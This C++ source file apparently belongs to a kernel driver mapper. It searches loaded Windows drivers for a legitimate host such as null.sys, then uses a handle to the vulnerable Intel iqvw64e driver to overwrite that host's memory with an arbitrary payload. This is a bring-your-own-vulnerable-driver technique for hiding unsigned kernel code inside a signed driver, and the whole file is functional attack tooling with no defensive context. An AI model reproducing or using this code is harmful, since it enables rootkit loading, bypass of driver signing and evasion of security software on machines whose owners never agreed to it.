#include "../include/parasite_utils.hpp"
#include "../include/intel_driver.hpp"
#include "../include/utils.hpp"
#include <Psapi.h>
#include <algorithm>

namespace parasite_utils
{
	bool FindHostModule(uint32_t min_size, HostModule& out_host)
	{
		LPVOID drivers[1024];
		DWORD cb_needed;
		if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb_needed))
		{
			int count = cb_needed / sizeof(LPVOID);
			for (int i = 0; i < count; i++)
			{
				char driver_name[MAX_PATH];
				if (GetDeviceDriverBaseNameA(drivers[i], driver_name, sizeof(driver_name)))
				{
					std::string name = driver_name;
					std::string lower_name = name;
					std::transform(lower_name.begin(), lower_name.end(), lower_name.begin(), ::tolower);
					
					if (lower_name == "null.sys" || lower_name == "luafv.sys" || lower_name == "vmsidebyside.sys")
					{
						char driver_path[MAX_PATH];
						if (GetDeviceDriverFileNameA(drivers[i], driver_path, sizeof(driver_path)))
						{
							std::vector<uint8_t> driver_data;
							if (utils::ReadFileToBuffer(driver_path, driver_data))
							{
								PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)driver_data.data();
								PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(driver_data.data() + dos->e_lfanew);
								
								if (nt->OptionalHeader.SizeOfImage >= min_size)
								{
									out_host.base = (uintptr_t)drivers[i];
									out_host.name = name;
									out_host.size = nt->OptionalHeader.SizeOfImage;
									std::cout << "[+] Parasite Host Hardened: " << name << " (0x" << std::hex << out_host.size << " bytes)" << std::dec << std::endl;
									return true;
								}
							}
						}
					}
				}
			}
		}
		return false;
	}

	bool HijackPhysicalMemory(HANDLE iqvw64e_device_handle, uintptr_t host_base, uint8_t* payload, uint32_t size)
	{
		for (uint32_t i = 0; i < size; i += 0x1000)
		{
			uint64_t virtual_addr = host_base + i;
			uint64_t physical_addr = 0; 
			
			if (!intel_driver::WriteMemory(iqvw64e_device_handle, virtual_addr, payload + i, min(0x1000, size - i)))
			{
				std::cout << "[-] Failed to overwrite host physical page at 0x" << std::hex << virtual_addr << std::dec << std::endl;
				return false;
			}
		}
		return true;
	}
}
